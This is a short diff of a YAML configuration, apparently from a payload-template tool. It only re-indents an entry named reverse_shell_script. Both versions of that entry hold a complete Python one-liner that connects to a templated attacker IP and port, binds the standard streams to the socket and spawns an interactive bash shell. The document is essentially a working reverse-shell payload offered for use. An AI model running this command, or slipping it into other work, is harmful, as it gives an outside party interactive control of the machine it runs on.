@@ -5,4 +5,4 @@ settings:
   image: python
 
 reverse_shell_script:
-- python3 -c "import sys, socket, os, pty; s=socket.socket(); s.connect((\"${{IP}}\",${{PORT}})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv('TERM', 'xterm'); pty.spawn('/bin/bash'); os.system('stty rows 24 columns 80'); sys.exit()"
+  - python3 -c "import sys, socket, os, pty; s=socket.socket(); s.connect((\"${{IP}}\",${{PORT}})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv('TERM', 'xterm'); pty.spawn('/bin/bash'); os.system('stty rows 24 columns 80'); sys.exit()"
